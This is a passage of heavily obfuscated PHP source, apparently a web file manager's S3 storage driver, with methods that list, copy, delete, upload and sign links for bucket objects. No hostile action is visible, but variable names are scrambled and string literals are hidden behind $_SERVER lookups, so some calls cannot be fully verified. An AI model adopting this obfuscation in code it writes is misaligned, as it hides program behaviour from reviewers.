= substr($ãœõêŒœ, 0, strlen($ãœõêŒœ) - strlen($ëÙ ¶›¦)); $ïÄÖö™ = $ã¹›Í”Ô . "\x28{$ã‡ÎØ‡¯}\x29{$ëÙ ¶›¦}"; while ($this->exist(rtrim($³¢¡’Ë­, $·œ£ƒõš[8]) . $·œ£ƒõš[8] . $ïÄÖö™)) { $ïÄÖö™ = $ã¹›Í”Ô . "\x28{$ã‡ÎØ‡¯}\51{$ëÙ ¶›¦}"; $ã‡ÎØ‡¯++; } return $ïÄÖö™; } private function fileNameAutoList($¿…´¢€è, $®§Ù„Š, $ëì¨Î©¡ = false) { $ËÏ²ŠÔ® =& $_SERVER[Ü©»’·]; $ ‰‚ÇºØ = $this->listPath($¿…´¢€è, !0); $ ‰‚ÇºØ = array_merge($ ‰‚ÇºØ[$ËÏ²ŠÔ®[82]], $ ‰‚ÇºØ[$ËÏ²ŠÔ®[83]]); $˜…¯†õŒ = array_to_keyvalue($ ‰‚ÇºØ, $ËÏ²ŠÔ®[12], $ËÏ²ŠÔ®[32]); $Ğ×ë»Ï¸ = $ËÏ²ŠÔ®[10] . get_path_ext($®§Ù„Š); $Ğ×ë»Ï¸ = $Ğ×ë»Ï¸ == $ËÏ²ŠÔ®[10] || $ëì¨Î©¡ ? $ËÏ²ŠÔ®[12] : $Ğ×ë»Ï¸; $êš‘£¹ı = substr($®§Ù„Š, 0, strlen($®§Ù„Š) - strlen($Ğ×ë»Ï¸)); $õ´¬®Œ = $êš‘£¹ı . "\50\60\51{$Ğ×ë»Ï¸}"; for ($†¯‹×í° = 1; $†¯‹×í° <= count($˜…¯†õŒ) + 1; $†¯‹×í°++) { $õ´¬®Œ = $êš‘£¹ı . "\x28{$†¯‹×í°}\51{$Ğ×ë»Ï¸}"; if (!in_array_not_case($õ´¬®Œ, $˜…¯†õŒ)) { return $õ´¬®Œ; } } return $õ´¬®Œ; } public function listAllFiles($ØÃ³í±, $Øíâ‰Ë‚, $Êí«ÄÍÎ = array()) { $ÚŞà„šé =& $_SERVER[Ü©»’·]; if (empty($Øíâ‰Ë‚)) { return array(); } $‡Ô¼Ã÷º = array(); $ØÃ³í± = trim($ØÃ³í±, $ÚŞà„šé[8]); foreach ($Øíâ‰Ë‚ as $•Í€’Ø£) { $¤”·Ñú­ = ltrim(substr(trim($•Í€’Ø£, $ÚŞà„šé[8]), strlen($ØÃ³í±)), $ÚŞà„šé[8]); $‡Ô¼Ã÷º = array_merge($‡Ô¼Ã÷º, $this->slicePath($¤”·Ñú­)); } $®ì¨ùÖõ = array(); foreach (array_unique($‡Ô¼Ã÷º) as $•Í€’Ø£) { $²Šâ§Ÿé = array($ÚŞà„šé[84] => $this->getPathOuter($ÚŞà„šé[8] . $ØÃ³í± . $ÚŞà„šé[8] . $•Í€’Ø£), $ÚŞà„šé[75] => 1, $ÚŞà„šé[76] => 0); if (substr($•Í€’Ø£, -1) != $ÚŞà„šé[8]) { $²Šâ§Ÿé[$ÚŞà„šé[75]] = 0; $Ø¡ø»úŠ = $this->getPath($ØÃ³í± . $ÚŞà„šé[8] . $•Í€’Ø£); $²Šâ§Ÿé[$ÚŞà„šé[76]] = isset($Êí«ÄÍÎ[$Ø¡ø»úŠ]) ? $Êí«ÄÍÎ[$Ø¡ø»úŠ] : $this->size($Ø¡ø»úŠ); } $®ì¨ùÖõ[] = $²Šâ§Ÿé; } return $®ì¨ùÖõ; } public function slicePath($½ÂÎåµ) { $ü’¹çƒ =& $_SERVER[Ü©»’·]; $‚©ãØ¸Œ = explode($ü’¹çƒ[8], trim($½ÂÎåµ, $ü’¹çƒ[8])); $Ú¯€ª˜ = 0; do { ++$Ú¯€ª˜; $œÇ±Ö[] = implode($ü’¹çƒ[8], array_slice($‚©ãØ¸Œ, 0, $Ú¯€ª˜)) . $ü’¹çƒ[8]; } while ($Ú¯€ª˜ < count($‚©ãØ¸Œ)); $œÇ±Ö[count($‚©ãØ¸Œ) - 1] = $½ÂÎåµ; return $œÇ±Ö; } public function getHost() { $çÙ°Â =& $_SERVER[Ü©»’·]; $£ä…î…ß = parse_url(trim($this->domain, $çÙ°Â[8])); $ò‡óÁ¤Ò = isset($£ä…î…ß[$çÙ°Â[180]]) ? $£ä…î…ß[$çÙ°Â[180]] : http_type(); $éÌ¶ø·¡ = isset($£ä…î…ß[$çÙ°Â[181]]) ? $£ä…î…ß[$çÙ°Â[181]] : $£ä…î…ß[$çÙ°Â[84]]; if (isset($£ä…î…ß[$çÙ°Â[182]])) { $éÌ¶ø·¡ .= $çÙ°Â[4] . $£ä…î…ß[$çÙ°Â[182]]; } return $ò‡óÁ¤Ò . $çÙ°Â[183] . $éÌ¶ø·¡; } public function pathEncode($ã´ŠÂŒ) { $ÀÖ²µ›… =& $_SERVER[Ü©»’·]; return str_replace($ÀÖ²µ›…[184], $ÀÖ²µ›…[8], rawurlencode($ã´ŠÂŒ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($½”Ã‚ÛÇ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ü©»’·][185]; parent::__construct(); $this->_init($½”Ã‚ÛÇ); } public function _init($ôÛ†¯á) { foreach ($ôÛ†¯á as $¤è£§Á‰ => $õ€ÈÔ°œ) { if (isset($this->{$¤è£§Á‰})) { $this->{$¤è£§Á‰} = $õ€ÈÔ°œ; } } $this->endpoint = $ôÛ†¯á[$_SERVER[Ü©»’·][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Õ°…€Ìá = "\x76\x34") { $this->signVer = $Õ°…€Ìá; $this->client->setSignatureVersion($Õ°…€Ìá); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $æÒûâŸ³ =& $_SERVER[Ü©»’·]; $ìˆ¦ÖŒÜ = $this->getBucketCors(); if (!$ìˆ¦ÖŒÜ || !is_array($ìˆ¦ÖŒÜ)) { return !1; } if ($ìˆ¦ÖŒÜ[$æÒûâŸ³[187]] != $æÒûâŸ³[188] || $ìˆ¦ÖŒÜ[$æÒûâŸ³[189]] != $æÒûâŸ³[188]) { return !1; } $ù¦Í•‡„ = array_map($æÒûâŸ³[190], $ìˆ¦ÖŒÜ[$æÒûâŸ³[191]]); if (!is_array($ù¦Í•‡„)) { $ù¦Í•‡„ = array(); } $ëß“Á€ = array($æÒûâŸ³[192], $æÒûâŸ³[193], $æÒûâŸ³[194], $æÒûâŸ³[195], $æÒûâŸ³[196]); $«ÚÓ÷ = array_diff($ëß“Á€, $ù¦Í•‡„); return empty($«ÚÓ÷); } public function mkfile($£æŠÑÜ­, $íÃÆ—Ô¸ = '', $ƒÊ°»±¯ = REPEAT_RENAME) { $ÖÁû‘’Ê = $this->setContent($£æŠÑÜ­, $íÃÆ—Ô¸); if ($ÖÁû‘’Ê !== !1) { return $this->getPathOuter($£æŠÑÜ­); } return !1; } public function mkdir($à‹Ïˆú , $Šª¼öÎÜ = REPEAT_SKIP) { $ ‡ƒ”‡ =& $_SERVER[Ü©»’·]; if (empty($à‹Ïˆú ) && $à‹Ïˆú  !== $ ‡ƒ”‡[197]) { return !1; } if ($Šª¼öÎÜ && $this->_isFolder($à‹Ïˆú )) { return $this->getPathOuter($à‹Ïˆú ); } $¼Ä¨£¾› = $this->setContent($à‹Ïˆú , $ ‡ƒ”‡[12], !0); if ($¼Ä¨£¾› !== !1) { return $this->getPathOuter($à‹Ïˆú ); } return !1; } public function copyFile($ªÆÛšÈ¸, $¯Óƒ…ªµ, $—öşİ‹ = array()) { $ÍáÆ´–Õ =& $_SERVER[Ü©»’·]; $Ü³ØÊÑ = $this->objectMeta($ªÆÛšÈ¸); if (!$Ü³ØÊÑ) { return !1; } if ($Ü³ØÊÑ[$ÍáÆ´–Õ[76]] <= 1024 * 1024 * 200) { $º­Å° = $this->client->copyObject($this->bucket, $ªÆÛšÈ¸, $this->bucket, $¯Óƒ…ªµ, $ÍáÆ´–Õ[198], $—öşİ‹); } else { $º­Å° = $this->client->multiCopyObject($this->bucket, $ªÆÛšÈ¸, $this->bucket, $¯Óƒ…ªµ, $—öşİ‹); } $º­Å° = $º­Å° ? $this->getPathOuter($¯Óƒ…ªµ) : !1; return $º­Å°; } public function moveFile($ƒÙŸ‹é±, $¿³ó¬±ç) { if ($this->copyFile($ƒÙŸ‹é±, $¿³ó¬±ç)) { $this->delFile($ƒÙŸ‹é±); return $this->getPathOuter($¿³ó¬±ç); } return !1; } public function delFile($ëË©‡Â˜) { return $this->client->deleteObject($this->bucket, $ëË©‡Â˜); } public function delFolder($¤’ùö) { $ç€¥îƒµ =& $_SERVER[Ü©»’·]; if (!$this->exist($¤’ùö)) { return !0; } $this->listItemCache = !1; $‡ùÖºñ¸ = $this->fileList($¤’ùö); $this->listItemCache = !0; $ÑÑ´¸õ = trim($¤’ùö, $ç€¥îƒµ[8]) . $ç€¥îƒµ[8]; if (!empty($¤’ùö) && $¤’ùö !== $ç€¥îƒµ[197] && !in_array($ÑÑ´¸õ, $‡ùÖºñ¸[$ç€¥îƒµ[82]])) { $‡ùÖºñ¸[$ç€¥îƒµ[82]][] = $ÑÑ´¸õ; } $ş³éõ‡ = $this->delByBatch($‡ùÖºñ¸[$ç€¥îƒµ[83]]); if (!$ş³éõ‡) { return !1; } $ş³éõ‡ = $this->delByBatch($‡ùÖºñ¸[$ç€¥îƒµ[82]]); if (!$ş³éõ‡) { return !1; } return $this->delFile($ÑÑ´¸õ); } private function delByBatch($´Ê–È¢ş) { foreach (array_chunk($´Ê–È¢ş, 1000) as $½Ÿ°ûï˜) { $Çé—ÕÀ´ = $this->client->deleteObjects($this->bucket, $½Ÿ°ûï˜); if (!$Çé—ÕÀ´) { return !1; } } return !0; } public function rename($­çâ¦ö¹, $¡ÛŠŠ„Š) { return $this->renameObject($­çâ¦ö¹, $¡ÛŠŠ„Š); } public function listPath($´‘Ğ«¢ì, $¥°¯½·Æ = false) { $¾šİ¤¹’ =& $_SERVER[Ü©»’·]; $ëØ†¡¾ì = $this->fileList($´‘Ğ«¢ì, $¾šİ¤¹’[8], !0); foreach ($ëØ†¡¾ì[$¾šİ¤¹’[82]] as $à˜íÑª“ => $×½ÏŒØÏ) { $ëØ†¡¾ì[$¾šİ¤¹’[82]][$à˜íÑª“] = $this->folderInfo($×½ÏŒØÏ, $¥°¯½·Æ, $×½ÏŒØÏ); } foreach ($ëØ†¡¾ì[$¾šİ¤¹’[83]] as $à˜íÑª“ => $×½ÏŒØÏ) { $ëØ†¡¾ì[$¾šİ¤¹’[83]][$à˜íÑª“] = $this->fileInfo($×½ÏŒØÏ[$¾šİ¤¹’[32]], $¥°¯½·Æ, $×½ÏŒØÏ); } return $ëØ†¡¾ì; } protected function infoChildren($òåñûÓ«, &$‰á¿øêã) { $Õ¿Ÿ‡˜ =& $_SERVER[Ü©»’·]; $‰äó²»æ = $this->fileList($òåñûÓ«, $Õ¿Ÿ‡˜[12], !0); $‰á¿øêã[$Õ¿Ÿ‡˜[78]] += count($‰äó²»æ[$Õ¿Ÿ‡˜[82]]); $‰á¿øêã[$Õ¿Ÿ‡˜[77]] += count($‰äó²»æ[$Õ¿Ÿ‡˜[83]]); foreach ($‰äó²»æ[$Õ¿Ÿ‡˜[83]] as $³¡ıÚ‚Ï) { if (!$³¡ıÚ‚Ï || !$³¡ıÚ‚Ï[$Õ¿Ÿ‡˜[76]]) { continue; } $‰á¿øêã[$Õ¿Ÿ‡˜[76]] += $³¡ıÚ‚Ï[$Õ¿Ÿ‡˜[76]]; } } private function fileInfo($İù²¼ñ›, $²ú‹İŠÆ = false, $â¸„’ŒÈ = array()) { $İ¼ÄâÁö =& $_SERVER[Ü©»’·]; $ê¾Áå£— = array($İ¼ÄâÁö[32] => $this->pathThis($İù²¼ñ›), $İ¼ÄâÁö[84] => $this->getPathOuter($İù²¼ñ›), $İ¼ÄâÁö[33] => $İ¼ÄâÁö[199], $İ¼ÄâÁö[174] => $this->ext($İù²¼ñ›), $İ¼ÄâÁö[76] => isset($â¸„’ŒÈ[$İ¼ÄâÁö[76]]) ? $â¸„’ŒÈ[$İ¼ÄâÁö[76]] : 0); if ($²ú‹İŠÆ) { return $ê¾Áå£—; } $ê¾Áå£—[$İ¼ÄâÁö[200]] = $ê¾Áå£—[$İ¼ÄâÁö[85]] = 0; $ê¾Áå£—[$İ¼ÄâÁö[201]] = $ê¾Áå£—[$İ¼ÄâÁö[202]] = !0; if (empty($â¸„’ŒÈ)) { $â¸„’ŒÈ = $this->objectMeta($İù²¼ñ›); if (!$â¸„’ŒÈ) { return $ê¾Áå£—; } } if (isset($â¸„’ŒÈ[$İ¼ÄâÁö[203]])) { $ê¾Áå£—[$İ¼ÄâÁö[85]] = $â¸„’ŒÈ[$İ¼ÄâÁö[203]]; } if (isset($â¸„’ŒÈ[$İ¼ÄâÁö[76]])) { $ê¾Áå£—[$İ¼ÄâÁö[76]] = $â¸„’ŒÈ[$İ¼ÄâÁö[76]]; } return $ê¾Áå£—; } private function folderInfo($ÛÇÍäß, $¬—ÔçÄî = false, $Ø·æíÅÖ = array()) { $ş¸ÑŒ“¶ =& $_SERVER[Ü©»’·]; $Ö Úò•  = array($ş¸ÑŒ“¶[32] => $this->pathThis($ÛÇÍäß), $ş¸ÑŒ“¶[84] => $this->getPathOuter($ş¸ÑŒ“¶[8] . $ÛÇÍäß), $ş¸ÑŒ“¶[33] => $ş¸ÑŒ“¶[75]); if ($¬—ÔçÄî) { return $Ö Úò• ; } $Ö Úò• [$ş¸ÑŒ“¶[200]] = $Ö Úò• [$ş¸ÑŒ“¶[85]] = 0; $Ö Úò• [$ş¸ÑŒ“¶[201]] = $Ö Úò• [$ş¸ÑŒ“¶[202]] = !0; if ($ÛÇÍäß == $ş¸ÑŒ“¶[12]) { return $Ö Úò• ; } if (empty($Ø·æíÅÖ)) { $Ø·æíÅÖ = $this->objectMeta(trim($ÛÇÍäß, $ş¸ÑŒ“¶[8]) . $ş¸ÑŒ“¶[8]); } if (isset($Ø·æíÅÖ[$ş¸ÑŒ“¶[203]])) { $Ö Úò• [$ş¸ÑŒ“¶[200]] = $Ø·æíÅÖ[$ş¸ÑŒ“¶[203]]; } return $Ö Úò• ; } private function fileList($Ä­¾ß’¶, $›İòË¹ = '', $˜éŒöÃË = 0) { $‚¤ÜçÏ =& $_SERVER[Ü©»’·]; $•Úúä£‹ = rtrim($Ä­¾ß’¶, $‚¤ÜçÏ[8]) . $‚¤ÜçÏ[8]; $í¹‘† = $this->listObjs($•Úúä£‹, null, null, $›İòË¹); if (!$í¹‘†) { return array($‚¤ÜçÏ[82] => array(), $‚¤ÜçÏ[83] => array()); } $«òœÇ = $İ’Ô†„ = array(); foreach ($í¹‘†[$‚¤ÜçÏ[204]] as $Ñ½§åº) { $­Î–ã¤ = $Ñ½§åº[$‚¤ÜçÏ[32]]; if ($­Î–ã¤ == $•Úúä£‹) { continue; } $—Å–š = isset($Ñ½§åº[$‚¤ÜçÏ[76]]) ? $Ñ½§åº[$‚¤ÜçÏ[76]] : 0; $ˆë´ªç = $—Å–š == 0 && substr($­Î–ã¤, strlen($­Î–ã¤) - 1, 1) == $‚¤ÜçÏ[8] ? !0 : !1; $this->cacheMethodInfoSet($­Î–ã¤, $ˆë´ªç, $Ñ½§åº); if ($ˆë´ªç) { $«òœÇ[] = $­Î–ã¤; continue; } $İ’Ô†„[] = $˜éŒöÃË ? $Ñ½§åº : $­Î–ã¤; } foreach ($í¹‘†[$‚¤ÜçÏ[205]] as $Ñ½§åº) { $«òœÇ[] = $Ñ½§åº[$‚¤ÜçÏ[32]]; $this->cacheMethodInfoSet($Ñ½§åº[$‚¤ÜçÏ[32]], !0); } $this->cacheMethodInfoSet($Ä­¾ß’¶, !0); return array($‚¤ÜçÏ[82] => $«òœÇ, $‚¤ÜçÏ[83] => $İ’Ô†„); } private function listObjs($©Û‹ŸñÄ, $î·Ç­ÂŞ = null, $õ„Ìƒ– = null, $™äÃºÓš = null) { $â¼åÇšê =& $_SERVER[Ü©»’·]; $©Û‹ŸñÄ = trim($©Û‹ŸñÄ, $â¼åÇšê[8]); $Ù¼ÌÄ´Î = empty($©Û‹ŸñÄ) && $©Û‹ŸñÄ !== $â¼åÇšê[197] ? $â¼åÇšê[12] : $©Û‹ŸñÄ . $â¼åÇšê[8]; return $this->client->getBucket($this->bucket, $Ù¼ÌÄ´Î, $î·Ç­ÂŞ, $õ„Ìƒ–, $™äÃºÓš, !0); } public function has($²Ô†¤­°, $³ˆÙÊ´± = false, $éßšÍ‚Ÿ = true) { $Ë¹äï¯ =& $_SERVER[Ü©»’·]; $²Ô†¤­° = trim($²Ô†¤­°, $Ë¹äï¯[8]); $˜í¥¥’Û = empty($²Ô†¤­°) && $²Ô†¤­° !== $Ë¹äï¯[197] ? $Ë¹äï¯[12] : $²Ô†¤­° . $Ë¹äï¯[8]; $îá“¼ö = null; $Õ¤ã•… = 500; $•É‚¬¬¼ = $Ë¹äï¯[8]; $Ñ¦åÔÏÙ = $šïê›Ë§ = array(); while (!0) { $íŸƒÒÄ = $this->listObjs($²Ô†¤­°, $îá“¼ö, $Õ¤ã•…, $•É‚¬¬¼); if (!$íŸƒÒÄ) { break; } $îá“¼ö = $íŸƒÒÄ[$Ë¹äï¯[206]]; $Ò¹…÷ñ‹ = $íŸƒÒÄ[$Ë¹äï¯[204]]; $û²Ö‚×® = $íŸƒÒÄ[$Ë¹äï¯[205]]; if (empty($Ò¹…÷ñ‹) && empty($û²Ö‚×®)) { break; } if (count($Ò¹…÷ñ‹) == 1 && $Ò¹…÷ñ‹[0][$Ë¹äï¯[32]] == $˜í¥¥’Û) { break; } if ($³ˆÙÊ´±) { if (count($Ò¹…÷ñ‹)) { $Ò¹…÷ñ‹ = array_column($Ò¹…÷ñ‹, $Ë¹äï¯[32]); $Ñ¦åÔÏÙ = array_merge($Ñ¦åÔÏÙ, $Ò¹…÷ñ‹); } if (count($û²Ö‚×®)) { $û²Ö‚×® = array_column($û²Ö‚×®, $Ë¹äï¯[32]); $šïê›Ë§ = array_merge($šïê›Ë§, $û²Ö‚×®); } if ($îá“¼ö === null) { break; } continue; } if ($éßšÍ‚Ÿ) { if (!empty($Ò¹…÷ñ‹)) { if (count($Ò¹…÷ñ‹) > 1 || isset($Ò¹…÷ñ‹[0][$Ë¹äï¯[32]]) && $Ò¹…÷ñ‹[0][$Ë¹äï¯[32]] != $˜í¥¥’Û) { return !0; } } } else { if (!empty($û²Ö‚×®)) { return !0; } } if ($îá“¼ö === null) { break; } } if ($³ˆÙÊ´±) { $Ñ¦åÔÏÙ = array_diff($Ñ¦åÔÏÙ, array($˜í¥¥’Û)); $Ñ¦åÔÏÙ = count(array_unique($Ñ¦åÔÏÙ)); $šïê›Ë§ = count(array_unique($šïê›Ë§)); return array($Ë¹äï¯[207] => $Ñ¦åÔÏÙ, $Ë¹äï¯[208] => $šïê›Ë§); } return !1; } public function listAll($ÈÔ•ÍˆÌ) { $¦¨ì¸®Ö =& $_SERVER[Ü©»’·]; $€öÅ•Êø = $this->fileList($ÈÔ•ÍˆÌ, $¦¨ì¸®Ö[12], !0); $„¬àß¹ = array(); foreach ($€öÅ•Êø[$¦¨ì¸®Ö[83]] as $«¨ğ±í˜) { $„¬àß¹[$«¨ğ±í˜[$¦¨ì¸®Ö[32]]] = $«¨ğ±í˜[$¦¨ì¸®Ö[76]]; } foreach ($€öÅ•Êø[$¦¨ì¸®Ö[82]] as $«¨ğ±í˜) { if (is_string($«¨ğ±í˜)) { $„¬àß¹[$«¨ğ±í˜] = 0; } } return $this->listAllFiles($ÈÔ•ÍˆÌ, array_keys($„¬àß¹), $„¬àß¹); } public function canRead($±ş÷ö¼•) { $ˆ¦ÔÍ”õ =& $_SERVER[Ü©»’·]; $¨™”ÎµÜ = $this->client->getAccessControlPolicy($this->bucket, $±ş÷ö¼•); if (!$¨™”ÎµÜ) { return !1; } return in_array($¨™”ÎµÜ, array($ˆ¦ÔÍ”õ[209], $ˆ¦ÔÍ”õ[210], $ˆ¦ÔÍ”õ[211])) ? !0 : !1; } public function canWrite($°ƒ“Ú³°) { $‰²ˆÈåÚ =& $_SERVER[Ü©»’·]; $±ÚãÀÒ˜ = $this->client->getAccessControlPolicy($this->bucket, $°ƒ“Ú³°); if (!$±ÚãÀÒ˜) { return !1; } return in_array($±ÚãÀÒ˜, array($‰²ˆÈåÚ[209], $‰²ˆÈåÚ[210])) ? !0 : !1; } public function getContent($°ÕşÃé) { return $this->client->getObject($this->bucket, $°ÕşÃé); } public function setContent($È™°á¢‹, $Ë‰«ü¢‚ = '', $µûƒ·›‰ = false) { $İ¥¸¥Çˆ =& $_SERVER[Ü©»’·]; $È™°á¢‹ = $µûƒ·›‰ ? trim($È™°á¢‹, $İ¥¸¥Çˆ[8]) . $İ¥¸¥Çˆ[8] : $È™°á¢‹; $Ë¯°Ş„ = get_file_mime(get_path_ext($È™°á¢‹)); $ŠŸß›Ö = $this->client->putObject($Ë‰«ü¢‚, $this->bucket, $È™°á¢‹, $İ¥¸¥Çˆ[198], array(), $Ë¯°Ş„); if (!$ŠŸß›Ö) { return !1; } if ($µûƒ·›‰) { return !0; } $this->cacheMethod(null, null); $ŠŸß›Ö = $this->copyFile($È™°á¢‹, $È™°á¢‹, array($İ¥¸¥Çˆ[212] => $ŠŸß›Ö[$İ¥¸¥Çˆ[213]])); return $ŠŸß›Ö ? !0 : !1; } public function fileSubstr($››ì†çÎ, $øé—¾¦, $¨«ØÅ¼) { $ÖçÛ® = $øé—¾¦ + $¨«ØÅ¼ - 1; return $this->client->getObject($this->bucket, $››ì†çÎ, array($_SERVER[Ü©»’·][214] => "\142\x79\x74\145\x73\x3d{$øé—¾¦}\55{$ÖçÛ®}")); } public function upload($ãåŠ¦‡, $õŞ‘ñø„, $»ÀÌÜØ = false, $øÙùÌİ = REPEAT_REPLACE) { $™¾Ú‘Î =& $_SERVER[Ü©»’·]; $‡Ó†—â = array($™¾Ú‘Î[212] => @md5_file($õŞ‘ñø„)); $­Œ«©… = array($™¾Ú‘Î[215] => get_file_mime(get_path_ext($ãåŠ¦‡))); if (IO::size($õŞ‘ñø„) <= 1024 * 1024 * 200) { $¨¡¼§ŒÓ = $this->client->putObjectFile($õŞ‘ñø„, $this->bucket, $ãåŠ¦‡, $™¾Ú‘Î[198], $‡Ó†—â, $­Œ«©…); return !empty($¨¡¼§ŒÓ) ? $this->getPathOuter($ãåŠ¦‡) : !1; } $˜¿Øì˜¤ = $this->client->multiUploadObject($õŞ‘ñø„, $this->bucket, trim($ãåŠ¦‡, $™¾Ú‘Î[8]), $‡Ó†—â, $­Œ«©…); return $˜¿Øì˜¤ ? $this->getPathOuter($ãåŠ¦‡) : !1; } public function download($â÷ÒÔ¬—, $Õîìø¢í) { if (!@is_dir($this->pathFather($Õîìø¢í)) && !IO::mkdir($this->pathFather($Õîìø¢í))) { return !1; } $Ş–ç¤á = $this->client->getObject($this->bucket, $â÷ÒÔ¬—, array(), $Õîìø¢í); return $Ş–ç¤á !== !1 ? $Õîìø¢í : !1; } public function link($„çÂË¬Ê, $Ü©™Ãà¯ = array()) { $ì¸¸ß¢ç =& $_SERVER[Ü©»’·]; if ($this->signVer == $ì¸¸ß¢ç[216]) { return $this->client->getAuthenticatedURL($this->bucket, $„çÂË¬Ê, 3600 * 12, $Ü©™Ãà¯); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($„çÂË¬Ê, $ì¸¸ß¢ç[8]), 3600 * 12, $this->region, array(), !0, $Ü©™Ãà¯); } public function fileOut($ËúÏ½Ó, $ß»¾ùïá = false, $Ô¿¹­É = false, $ïÛŸ¹ßÔ = '') { $™Ñ´çò =& $_SERVER[Ü©»’·]; if ($this->isFileOutServer()) { return $this->fileOutServer($ËúÏ½Ó, $ß»¾ùïá, $Ô¿¹­É, $ïÛŸ¹ßÔ); } if (!$Ô¿¹­É) { $Ô¿¹­É = $this->pathThis($ËúÏ½Ó); } $›ÇÃÅ‘º = get_file_mime(get_path_ext($Ô¿¹­É)); if ($›ÇÃÅ‘º == $™Ñ´çò[217]) { return parent::fileOut($ËúÏ½Ó, $ß»¾ùïá, $Ô¿¹­É, $ïÛŸ¹ßÔ); } $Æûå£Ñ = array($™Ñ´çò[218] => $›ÇÃÅ‘º); if ($ß»¾ùïá) { $Æûå£Ñ[$™Ñ´çò[219]] = $™Ñ´çò[220] . rawurlencode($Ô¿¹­É); } else { } $³œÉëíå = $this->link($ËúÏ½Ó, $Æûå£Ñ); $this->fileOutLink($³œÉëíå); } public function fileOutServer($ĞØŒ, $¼¿´›ùñ = false, $æ½Åûİ„ = false, $ËÕİ½Œ– = '') { parent::fileOut($ĞØŒ, $¼¿´›ùñ, $æ½Åûİ„, $ËÕİ½Œ–); } public function fileOutImageServer($ã­å¾ğ€, $óóÂ£Ç = 250) { parent::fileOutImage($ã­å¾ğ€, $óóÂ£Ç); } public function hashMd5($áÃÍƒğ’, $ÅÛ½¡Œ¥ = '') { $šĞÂãò¾ =& $_SERVER[Ü©»’·]; $Åë¶˜–Õ = $this->objectMeta($áÃÍƒğ’); if (!$Åë¶˜–Õ) { return !1; } $ÅÛ½¡Œ¥ = $ÅÛ½¡Œ¥ ? $ÅÛ½¡Œ¥ : _get($Åë¶˜–Õ, $šĞÂãò¾[221]); $ÅÛ½¡Œ¥ = $ÅÛ½¡Œ¥ ? $ÅÛ½¡Œ¥ : _get($Åë¶˜–Õ, $šĞÂãò¾[213], $šĞÂãò¾[12]); return $ÅÛ½¡Œ¥; } public function uploadFormData($Ú€Ì¬ï‚, $çÌÅ¾é = 3600) { $ÊŞì·­§ =& $_SERVER[Ü©»’·]; $´ƒßœÆ = $this->pathFather($Ú€Ì¬ï‚); $œó›™×ú = $this->client->getHttpUploadPostParams($this->bucket, $´ƒßœÆ, $ÊŞì·­§[198], $çÌÅ¾é); return array_merge((array) $œó›™×ú, array($ÊŞì·­§[181] => $this->getHost())); } public function multiUploadFormData($ÛÄ™±€±, $í’’ëñÙ = 3600) { $“åœ±ğè =& $_SERVER[Ü©»’·]; $…ˆôóü… = gmdate($“åœ±ğè[222]); $²Œ¨õ¾Ê = array(); $€¥ãœãå = $this->client->getUploadId($this->bucket, $ÛÄ™±€±, $²Œ¨õ¾Ê); if (!$€¥ãœãå) { return !1; } return array($“åœ±ğè[223] => $€¥ãœãå, $“åœ±ğè[181] => $this->getHost() . $“åœ±ğè[8] . $this->pathEncode($ÛÄ™±€±), $“åœ±ğè[224] => $…ˆôóü…, $“åœ±ğè[94] => $ÛÄ™±€±); } public function multiUploadAuthData($üˆ“ÁŠÎ, $ãÊÔÅÅö = array()) { $¨şòÇ =& $_SERVER[Ü©»’·]; $ş„°ğƒ = isset($ãÊÔÅÅö[$¨şòÇ[224]]) ? $ãÊÔÅÅö[$¨şòÇ[224]] : gmdate($¨şòÇ[222]); $äï€×Ó¾ = isset($ãÊÔÅÅö[$¨şòÇ[174]]) ? $ãÊÔÅÅö[$¨şòÇ[174]] : $¨şòÇ[12]; $”Â ‚Íİ = $ãÊÔÅÅö[$¨şòÇ[94]]; unset($ãÊÔÅÅö[$¨şòÇ[94]]); if (isset($ãÊÔÅÅö[$¨şòÇ[225]])) { $ãÊÔÅÅö[$¨şòÇ[224]] = $ş„°ğƒ; return $this->listUploadParts($”Â ‚Íİ, $ãÊÔÅÅö); } $œÖìğ™ = array($¨şòÇ[226], $¨şòÇ[12], $¨şòÇ[120], $¨şòÇ[12], "\x78\55\141\x6d\x7a\x2d\x64\141\x74\x65\x3a{$ş„°ğƒ}", $¨şòÇ[8] . $this->bucket . $¨şòÇ[8] . $this->pathEncode($”Â ‚Íİ) . $äï€×Ó¾); if (strpos($äï€×Ó¾, $¨şòÇ[227]) === 0) { $œÖìğ™[0] = $¨şòÇ[228]; } if (isset($ãÊÔÅÅö[$¨şòÇ[229]]) && $ãÊÔÅÅö[$¨şòÇ[229]] == $¨şòÇ[230]) { $œÖìğ™[0] = $¨şòÇ[230]; } $ÜÄÃÎ­ = implode($¨şòÇ[231], $œÖìğ™); $ÑêúñØÚ = base64_encode(hash_hmac($¨şòÇ[232], $ÜÄÃÎ­, $this->secret, !0)); $ÑÃâ‚º’ = $¨şòÇ[233] . $this->accessKey . $¨şòÇ[4] . $ÑêúñØÚ; if (strpos($äï€×Ó¾, $¨şòÇ[227]) === 0) { return array($¨şòÇ[234] => $ÑÃâ‚º’, $¨şòÇ[224] => $ş„°ğƒ); } return $ÑÃâ‚º’; } public function listUploadParts($¿’Óƒã, $Â¾ô“¬· = array()) { $Ş–Ì“È =& $_SERVER[Ü©»’·]; $¥í˜¹ş = str_replace($Ş–Ì“È[235], $Ş–Ì“È[12], $Â¾ô“¬·[$Ş–Ì“È[174]]); $‚°×òÛß = $this->client->listParts($this->bucket, $¿’Óƒã, $¥í˜¹ş); if (!$‚°×òÛß) { return !1; } unset($Â¾ô“¬·[$Ş–Ì“È[225]], $Â¾ô“¬·[$Ş–Ì“È[229]]); $Â¾ô“¬·[$Ş–Ì“È[94]] = $¿’Óƒã; $ÅÊáºÇ = $this->multiUploadAuthData($¿’Óƒã, $Â¾ô“¬·); if (empty($ÅÊáºÇ)) { return !1; } return array($Ş–Ì“È[234] => $ÅÊáºÇ, $Ş–Ì“È[224] => $Â¾ô“¬·[$Ş–Ì“È[224]], $Ş–Ì“È[236] => $‚°×òÛß); } 